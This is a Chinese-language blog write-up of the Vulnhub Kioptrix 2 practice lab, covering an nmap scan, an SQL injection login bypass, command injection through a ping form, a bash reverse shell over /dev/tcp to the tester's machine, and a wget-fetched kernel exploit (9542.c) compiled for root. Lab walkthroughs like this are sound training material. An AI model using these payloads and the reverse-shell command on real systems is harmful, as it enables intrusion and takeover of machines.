<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Vulnhub渗透测试练习-Kioptrix 2 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="Vulnhub渗透测试练习-Kioptrix 2 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">Vulnhub渗透测试练习-Kioptrix 2</h1><div class="post-time">May 7, 2018</div><div class="post-content"><!-- ttoc -->
<h2><span id="信息收集">信息收集</span></h2><p>同样是<code>netdiscover</code>收集信息，发现目标IP地址。</p>
<p>目标的IP地址为<code>192.168.43.47</code></p>
<p>nmap扫描端口信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sS -A -T4 192.168.43.47</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-07 05:01 EDT</span><br><span class="line">Nmap scan report for 192.168.43.47</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)</span><br><span class="line">|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)</span><br><span class="line">|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">|_http-server-header: Apache/2.0.52 (CentOS)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100024  1            841/udp  status</span><br><span class="line">|_  100024  1            844/tcp  status</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">|_http-server-header: Apache/2.0.52 (CentOS)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid before: 2009-10-08T00:10:47</span><br><span class="line">|_Not valid after:  2010-10-08T00:10:47</span><br><span class="line">|_ssl-date: 2018-05-07T05:51:42+00:00; -3h09m44s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: PUT</span><br><span class="line">|_http-server-header: CUPS/1.1</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:53:19:4C (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.30</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -3h09m44s, deviation: 0s, median: -3h09m44s</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.47 ms 192.168.43.47</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.46 seconds</span><br></pre></td></tr></table></figure>
<h2><span id="漏洞利用">漏洞利用</span></h2><p>存在<code>80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</code>端口</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_1.png" alt=""></p>
<p>尝试万能密码<code>&#39; or 1=1#</code> ，成功登录。</p>
<p>可以看到一个执行ping命令的框框。</p>
<p>可见是一个命令执行漏洞。</p>
<p>在命令执行中是有<code>| &amp;&amp; || ;</code>这些常见的符号的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# whoai||id			//如果||左边的命令（命令1）未执行成功，那么就执行||右边的命令（命令2）；</span><br><span class="line">bash: whoai: 未找到命令</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)	</span><br><span class="line">root@kali:~# whoami|id			//执行后一个命令</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br><span class="line">root@kali:~# whoami;id			//按顺序执行</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br><span class="line">root@kali:~# whoami&amp;&amp;id			//&amp;&amp;左边的命令（命令1）返回真(即返回0，成功被执行）后，&amp;&amp;右边的命令（命令2）才能够被执行</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br></pre></td></tr></table></figure>
<p>这里我们可以利用<code>| ;</code>进行命令执行</p>
<p>测试<code>cat /etc/passwd</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_2.png" alt=""></p>
<p>下面用命令执行一个交互shell.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;bash -i &gt;&amp; /dev/tcp/192.168.43.177/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>同时用<code>nc</code>监听2333端口。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3.png" alt=""></p>
<p>得到一个交互shell。但是权限是<code>apache</code>用户。</p>
<h2><span id="权限提升">权限提升</span></h2><p>当前的权限是<code>apache</code>用户,我们需要对他进行提权得到<code>root</code>权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ uname -a</span><br><span class="line">Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span><br></pre></td></tr></table></figure>
<p>查看当前系统版本。<code>searchsploit linux 2.6.9</code>查找相关提权漏洞</p>
<p><code>https://www.exploit-db.com/download/9542.c</code></p>
<p>利用到9542.c的exp.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ cd /tmp</span><br><span class="line">bash-3.00$ wget http://192.168.43.177/9542.c</span><br><span class="line">--03:06:55--  http://192.168.43.177/9542.c</span><br><span class="line">           =&gt; `9542.c&apos;</span><br><span class="line">Connecting to 192.168.43.177:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 2,645 (2.6K) [text/x-csrc]</span><br><span class="line"></span><br><span class="line">    0K ..                                                    100%  252.25 MB/s</span><br><span class="line"></span><br><span class="line">03:06:55 (252.25 MB/s) - `9542.c&apos; saved [2645/2645]</span><br><span class="line"></span><br><span class="line">bash-3.00$ gcc -o 9542 9542.c</span><br><span class="line">bash-3.00$ ./9542</span><br><span class="line">sh: no job control in this shell</span><br><span class="line">sh-3.00# id</span><br><span class="line">uid=0(root) gid=0(root) groups=48(apache)</span><br><span class="line">sh-3.00# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>提权成功。</p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/Vulnhub渗透测试练习-Kioptrix-3.html" class="prev">上一篇</a><a href="/posts/notes/Vulnhub渗透测试练习-Kioptrix-1.html" class="next">下一篇</a></div><div class="copyright"><p>© 2016 - 2024 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>